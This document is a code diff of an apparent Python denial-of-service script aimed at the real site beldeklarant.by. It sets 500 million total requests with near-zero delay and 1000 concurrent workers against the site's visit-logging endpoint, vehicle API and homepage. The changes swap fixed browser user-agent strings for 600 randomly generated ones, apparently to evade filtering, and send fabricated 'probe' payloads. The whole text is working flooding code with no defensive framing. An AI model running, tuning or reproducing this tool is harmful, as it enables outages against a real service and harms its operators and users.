@@ -1,6 +1,7 @@
 import asyncio
 import random
 import secrets
+import string
 import time
 import uuid
 from datetime import datetime, timezone
@@ -21,44 +22,26 @@ CHECKS = [
     {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
     {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
     {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
     {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": True},
     {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=VF1HJD40967428809", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=U5YPV81BHNL087801", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=JM3KFBDM3P0201488", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=JTME6RFV5RJ895216", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=TMBAR7NE7K0015421", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=C6I7ZFJSYX60T62JR", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/api/vehicles?vin=4Z93H0GZ16J5B9130", "method": "GET", "ssl": True},
-    {"url": "https://beldeklarant.by/", "method": "GET", "ssl": True},
     {"url": "https://beldeklarant.by/", "method": "GET", "ssl": True},
 ]
 
 TOTAL_REQUESTS = 500000000
-DELAY_BETWEEN_REQ = 0.0001
-MAX_CONCURRENT = 1500
+DELAY_BETWEEN_REQ = 0.00001
+MAX_CONCURRENT = 1000
 
 
 USER_AGENTS = [
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/117.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
-    "Mozilla/5.0 (Linux; Android 10; TCL 20 Pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (SMART-TV; Linux; Tizen 7.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 TV Safari/537.36",
-    "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 DMOST/1.0",
-    "Mozilla/5.0 (Linux; Android 9; LG-U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; INFINIX GT 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+    (
+        f"Mozilla/5.0 ({''.join(random.choices(string.ascii_letters + string.digits, k=16))}; "
+        f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}) "
+        f"AppleWebKit/{''.join(random.choices(string.digits, k=3))}.0 "
+        f"(KHTML, like Gecko) Version/{random.randint(10, 19)}.0 "
+        f"Mobile/{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))} "
+        f"Safari/{''.join(random.choices(string.digits, k=3))}.{''.join(random.choices(string.digits, k=1))}"
+    )
+    for _ in range(600)
 ]
 
 
@@ -68,7 +51,6 @@ def build_payload(request_num: int, worker_id: int) -> dict:
         "requestId": f"req-{request_num}-w{worker_id}-{uuid.uuid4().hex}",
         "page": f"/probe/{uuid.uuid4().hex[:12]}",
         "timestamp": iso_string,
-        "nonce": secrets.token_hex(8),
         "userAgent": random.choice(USER_AGENTS),
     }
 
